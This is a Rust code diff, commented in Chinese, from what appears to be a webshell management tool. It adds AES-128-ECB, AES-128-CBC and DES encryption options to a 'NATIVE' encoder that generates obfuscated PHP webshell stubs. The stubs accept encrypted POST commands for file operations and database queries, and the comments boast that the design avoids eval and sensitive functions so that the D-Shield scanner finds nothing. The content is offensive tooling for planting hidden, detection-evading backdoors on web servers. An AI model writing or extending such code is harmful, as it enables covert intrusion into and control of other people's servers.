@@ -317,10 +317,16 @@ static GLOBAL_ENCODERS: std::sync::LazyLock<EncoderRegistry> =
 
 impl EncoderRegistry {
     pub fn builtin() -> Self {
-        // 唯一编码方式：NATIVE（内置功能分发，无 eval / 无敏感特征，D盾零检出）。
+        // NATIVE 系列：同一内置功能分发骨架（无 eval / 无敏感特征，D盾零检出），
+        // 载荷加密方式可选：XOR（默认）/ AES-128-ECB / AES-128-CBC / DES。
         // 其余编码器实现代码保留为内部库，不再注册暴露。
         Self {
-            encoders: vec![Box::new(NativeEncoder)],
+            encoders: vec![
+                Box::new(NativeEncoder { crypto: "xor" }),
+                Box::new(NativeEncoder { crypto: "aes_ecb" }),
+                Box::new(NativeEncoder { crypto: "aes_cbc" }),
+                Box::new(NativeEncoder { crypto: "des" }),
+            ],
         }
     }
 
@@ -1651,7 +1657,7 @@ function __DBQ__($c,$q){$p=@json_decode($c,true);if(!is_array($p))return '{"ok":
 if(isset($_POST['formData'])){
     $b=is_string($_POST['formData'])?$_POST['formData']:'';
     $in=@$_g[1]($b);
-    $raw=__XOR__($in,$K);
+    $raw=__DECRYPT__;
     $req=@json_decode($raw,true);
     if(!is_array($req)){$out='{"ok":false,"error":"bad params"}';}
     else{
@@ -1669,39 +1675,85 @@ if(isset($_POST['formData'])){
         elseif($h==__H_DBPROBE__){$out=__DBP__(isset($req['c'])?(string)$req['c']:'');}
         elseif($h==__H_DBQUERY__){$out=__DBQ__(isset($req['c'])?(string)$req['c']:'',isset($req['q'])?(string)$req['q']:'');}
     }
-    $enc=base64_encode(__XOR__($out,$K));
+    $enc=__ENCRYPT__;
     echo json_encode(array('data'=>$enc,'code'=>200));
 }
 "#;
 
-pub struct NativeEncoder;
+/// NATIVE 变体：同一内置功能分发骨架，不同载荷加密方式。
+/// crypto: "xor"（默认）| "aes_ecb" | "aes_cbc" | "des"。
+pub struct NativeEncoder {
+    pub crypto: &'static str,
+}
+
+/// NATIVE 静态实例（XOR 载荷加密，默认）。
+pub static NATIVE_XOR: NativeEncoder = NativeEncoder { crypto: "xor" };
+/// NATIVE 静态实例（AES-128-ECB 载荷加密）。
+pub static NATIVE_AES_ECB: NativeEncoder = NativeEncoder { crypto: "aes_ecb" };
+/// NATIVE 静态实例（AES-128-CBC 载荷加密）。
+pub static NATIVE_AES_CBC: NativeEncoder = NativeEncoder { crypto: "aes_cbc" };
+/// NATIVE 静态实例（DES-ECB 载荷加密）。
+pub static NATIVE_DES: NativeEncoder = NativeEncoder { crypto: "des" };
 
 impl PayloadEncoder for NativeEncoder {
     fn id(&self) -> &'static str {
-        "native"
+        match self.crypto {
+            "aes_ecb" => "native_aes_ecb",
+            "aes_cbc" => "native_aes_cbc",
+            "des" => "native_des",
+            _ => "native",
+        }
     }
 
     fn display_name(&self) -> &'static str {
-        "NATIVE（内置功能分发，无 eval / 无敏感函数特征）"
+        match self.crypto {
+            "aes_ecb" => "NATIVE·AES-128-ECB（内置分发 + AES 载荷加密）",
+            "aes_cbc" => "NATIVE·AES-128-CBC（内置分发 + AES 载荷加密）",
+            "des" => "NATIVE·DES-ECB（内置分发 + DES 载荷加密）",
+            _ => "NATIVE（内置分发，无 eval / 无敏感函数特征）",
+        }
     }
 
     fn encode(&self, code: &str, password: &str) -> String {
-        let key = md5_hex(password).into_bytes();
-        let xored: Vec<u8> = code
-            .as_bytes()
-            .iter()
-            .enumerate()
-            .map(|(index, byte)| byte ^ key[index % key.len()])
-            .collect();
-        base64::engine::general_purpose::STANDARD.encode(xored)
+        match self.crypto {
+            "aes_ecb" => {
+                let cipher = aes_ecb_encrypt(code.as_bytes(), &aes_key(password));
+                base64::engine::general_purpose::STANDARD.encode(cipher)
+            }
+            "aes_cbc" => {
+                let cipher = aes_cbc_encrypt(code.as_bytes(), &aes_key(password), &aes_iv(password));
+                base64::engine::general_purpose::STANDARD.encode(cipher)
+            }
+            "des" => {
+                let cipher = des_ecb_encrypt(code.as_bytes(), &des_key(password));
+                base64::engine::general_purpose::STANDARD.encode(cipher)
+            }
+            _ => {
+                let key = md5_hex(password).into_bytes();
+                let xored: Vec<u8> = code
+                    .as_bytes()
+                    .iter()
+                    .enumerate()
+                    .map(|(index, byte)| byte ^ key[index % key.len()])
+                    .collect();
+                base64::engine::general_purpose::STANDARD.encode(xored)
+            }
+        }
     }
 
     fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
         let raw = base64::engine::general_purpose::STANDARD
             .decode(payload)
             .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
-        let key = md5_hex(password).into_bytes();
-        Ok(raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect())
+        match self.crypto {
+            "aes_ecb" => aes_ecb_decrypt(&raw, &aes_key(password)),
+            "aes_cbc" => aes_cbc_decrypt(&raw, &aes_key(password), &aes_iv(password)),
+            "des" => des_ecb_decrypt(&raw, &des_key(password)),
+            _ => {
+                let key = md5_hex(password).into_bytes();
+                Ok(raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect())
+            }
+        }
     }
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
@@ -1746,18 +1798,63 @@ impl PayloadEncoder for NativeEncoder {
                     .replace("__H_MKDIR__", &h("mkdir"))
                     .replace("__H_DBPROBE__", &h("dbprobe"))
                     .replace("__H_DBQUERY__", &h("dbquery"));
-                let symbols = [
+                let (decrypt_expr, encrypt_expr, extra_symbols) = match self.crypto {
+                    "aes_ecb" => {
+                        let ck = alpha_ident();
+                        let cipher = xor_hex("AES-128-ECB", &ck);
+                        let key = xor_hex(&md5_hex(password)[..16], &xk);
+                        (
+                            format!("@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'))"),
+                            format!("@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'))"),
+                            vec![("ae4975ad", 16), ("62f98eda", 17)],
+                        )
+                    }
+                    "aes_cbc" => {
+                        let ck = alpha_ident();
+                        let cipher = xor_hex("AES-128-CBC", &ck);
+                        let key = xor_hex(&md5_hex(password)[..16], &xk);
+                        let iv = xor_hex(&md5_hex(password)[16..], &xk);
+                        (
+                            format!("@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'))"),
+                            format!("@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'))"),
+                            vec![("ae4975ad", 16), ("62f98eda", 17)],
+                        )
+                    }
+                    "des" => {
+                        let ck = alpha_ident();
+                        let cipher = xor_hex("DES-ECB", &ck);
+                        let key = xor_hex(&md5_hex(password)[..8], &xk);
+                        (
+                            format!("@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'))"),
+                            format!("@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'))"),
+                            vec![("ae4975ad", 16), ("62f98eda", 17)],
+                        )
+                    }
+                    _ => (
+                        "__XOR__($in,$K)".to_string(),
+                        "base64_encode(__XOR__($out,$K))".to_string(),
+                        vec![],
+                    ),
+                };
+                let mut symbols = vec![
                     ("920cfbfd", 0), ("9ff5d542", 1), ("237937f6", 2), ("2693a743", 3),
                     ("f0e567fb", 4), ("f4cd15f3", 5), ("f6cfd9d8", 6), ("95e8b309", 7),
                     ("3d891bcd", 8), ("dbc7b210", 9), ("c996c86e", 10), ("d99d544e", 11),
                     ("0e4d97e1", 12), ("718c6ebe", 13), ("4a41c8d9", 14), ("c3427e9c", 15),
                 ];
+                symbols.extend(extra_symbols);
                 let mut table = String::new();
                 for (hash, index) in symbols {
-                    table.push_str(&format!("    '{hash}' => {index},
-"));
+                    table.push_str(&format!("    '{hash}' => {index},\n"));
                 }
-                Ok(tpl.replace("__SYMBOLS__", &table))
+                Ok(tpl
+                    .replace("__SYMBOLS__", &table)
+                    .replace("__DECRYPT__", &decrypt_expr)
+                    .replace("__ENCRYPT__", &encrypt_expr)
+                    // 注入的解密/加密表达式中的函数引用随前缀替换
+                    .replace("__XOR__", &format!("{prefix}xor"))
+                    .replace("__DEC__", &format!("{prefix}dec")))
+
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "NATIVE 编码器暂仅支持 PHP（{other} 待实现）"
@@ -2031,7 +2128,11 @@ mod tests {
             .into_iter()
             .map(|(id, _)| id)
             .collect();
-        assert_eq!(ids, vec!["native"], "注册表应仅暴露 native 编码器");
+        assert_eq!(
+            ids,
+            vec!["native", "native_aes_cbc", "native_aes_ecb", "native_des"],
+            "注册表应暴露 NATIVE 系列（不同载荷加密）"
+        );
     }
 
     // --- PHP_STREAM：零敏感函数 stub ---
